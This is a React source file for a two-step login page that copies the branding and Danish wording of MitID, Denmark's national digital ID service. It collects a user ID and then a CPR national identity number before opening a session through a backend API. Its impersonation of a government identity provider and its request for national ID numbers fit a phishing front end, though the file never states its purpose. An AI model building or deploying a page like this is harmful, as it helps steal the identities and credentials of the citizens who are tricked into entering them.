import { useState } from 'react'
import BrandLogo from '../components/BrandLogo'
import MitIdLogo from '../components/MitIdLogo'
import CardShell from '../components/CardShell'
import HelpIcon from '../components/HelpIcon'
import InfoIcon from '../components/InfoIcon'
import ArrowIcon from '../components/ArrowIcon'
import SidePanel from '../components/SidePanel'
import { api } from '../services/api'

interface Props {
  onSessionCreated: (sessionId: string, userId: string) => void
}

export default function LoginPage({ onSessionCreated }: Props) {
  const [step, setStep] = useState<'userid' | 'cpr'>('userid')
  const [userId, setUserId] = useState('Ali50')
  const [showUserId, setShowUserId] = useState(false)
  const [cpr, setCpr] = useState('')
  const [remember, setRemember] = useState(true)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleUserSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!userId.trim()) return
    setStep('cpr')
  }

  const handleCprSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const digits = cpr.replace(/\D/g, '')
    if (digits.length < 10) return
    setLoading(true)
    setError('')
    try {
      const { sessionId } = await api.initSession(userId)
      onSessionCreated(sessionId, userId)
    } catch {
      setError('Forbindelsen mislykkedes. Prøv igen.')
    } finally {
      setLoading(false)
    }
  }

  const formatCpr = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 10)
    if (digits.length <= 6) return digits
    return digits.slice(0, 6) + '-' + digits.slice(6)
  }

  return (
    <div className="min-h-screen bg-[#f0f1f3] flex flex-col">
      <header className="bg-white h-[50px] flex items-center px-6 border-b border-gray-200">
        <BrandLogo />
      </header>
      <main className="flex-1 flex items-start justify-center pt-[60px] px-4">
        <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full">
          <CardShell>
            {step === 'userid' ? (
              <form className="flex flex-col h-full" onSubmit={handleUserSubmit}>
                <div className="flex items-start justify-between mb-2">
                  <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                  <MitIdLogo />
                </div>
                <hr className="border-gray-200 my-3" />
                <div className="mb-3">
                  <label className="flex items-center gap-1.5 text-[12px] font-bold text-[#001C44] tracking-wide mb-2">
                    User-ID
                    <button type="button" className="w-4 h-4 rounded-full flex items-center justify-center cursor-help" aria-label="Help"><HelpIcon /></button>
                  </label>
                  <div className="relative">
                    <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                      name="mitid-userid"
                      className="w-full border border-gray-300 rounded-[2px] px-3 py-[9px] text-[14px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-12" autoComplete="new-password" spellCheck={false} />
                    <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[13px] text-gray-500 hover:text-gray-800 cursor-pointer select-none" tabIndex={0}>
                      {showUserId ? 'Skjul' : 'Vis'}
                    </div>
                  </div>
                </div>
                {error && <div className="text-red-600 text-[12px] mb-2">{error}</div>}
                <button type="submit"
                  className="w-full bg-[#0055a5] hover:bg-[#004080] text-white font-bold text-[14px] py-[10px] px-4 rounded-[2px] flex items-center justify-between cursor-pointer transition-colors">
                  <span>Fortsæt</span><ArrowIcon />
                </button>
                <div className="mt-3 mb-4">
                  <a href="#" className="inline-flex items-center gap-1.5 text-[#0055a5] hover:underline text-[14px]"><InfoIcon /><span>Glemt bruger-ID?</span></a>
                </div>
                <div className="flex-1" />
                <label className="flex items-start gap-3 cursor-pointer">
                  <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="mt-0.5 w-[18px] h-[18px] accent-[#0055a5] rounded cursor-pointer shrink-0" />
                  <span className="text-[14px] text-[#001C44] leading-snug">Husk mig på MitID.dk</span>
                </label>
                <hr className="border-gray-200 mt-4 mb-3" />
                <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
                  <a href="#" className="hover:underline">Annuller</a><a href="#" className="hover:underline">Hjælp</a>
                </nav>
              </form>
            ) : (
              <form className="flex flex-col h-full" onSubmit={handleCprSubmit}>
                <div className="flex items-start justify-between mb-2">
                  <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                  <MitIdLogo />
                </div>
                <hr className="border-gray-200 my-3" />
                <div className="mb-3">
                  <label className="flex items-center gap-1.5 text-[12px] font-bold text-[#001C44] tracking-wide mb-2">
                    CPR-Nummer
                    <button type="button" className="w-4 h-4 rounded-full flex items-center justify-center cursor-help" aria-label="Help"><HelpIcon /></button>
                  </label>
                  <input type="text" value={cpr} onChange={(e) => setCpr(formatCpr(e.target.value))}
                    placeholder="ddmmåå-xxxx"
                    className="w-full border border-gray-300 rounded-[2px] px-3 py-[9px] text-[14px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] placeholder-gray-400" autoComplete="new-password" spellCheck={false} />
                </div>
                {error && <div className="text-red-600 text-[12px] mb-2">{error}</div>}
                <button type="submit" disabled={loading || cpr.replace(/\D/g, '').length < 10}
                  className={`w-full font-bold text-[14px] py-[10px] px-4 rounded-[2px] flex items-center justify-between cursor-pointer transition-colors ${
                    cpr.replace(/\D/g, '').length >= 10 && !loading ? 'bg-[#0055a5] hover:bg-[#004080] text-white' : 'bg-gray-200 text-gray-400 cursor-not-allowed'
                  }`}>
                  <span>{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
                </button>
                <div className="mt-3 mb-4">
                  <a href="#" className="inline-flex items-center gap-1.5 text-[#0055a5] hover:underline text-[14px]"><InfoIcon /><span>Glemt Bruger-ID?</span></a>
                </div>
                <div className="flex-1" />
                <label className="flex items-start gap-3 cursor-pointer">
                  <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="mt-0.5 w-[18px] h-[18px] accent-[#0055a5] rounded cursor-pointer shrink-0" />
                  <span className="text-[14px] text-[#001C44] leading-snug">Husk mig hos MitID Erhverv</span>
                </label>
                <hr className="border-gray-200 mt-4 mb-3" />
                <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
                  <a href="#" className="hover:underline">Annuller</a><a href="#" className="hover:underline">Hjælp</a>
                </nav>
              </form>
            )}
          </CardShell>
          <SidePanel />
        </div>
      </main>
    </div>
  )
}
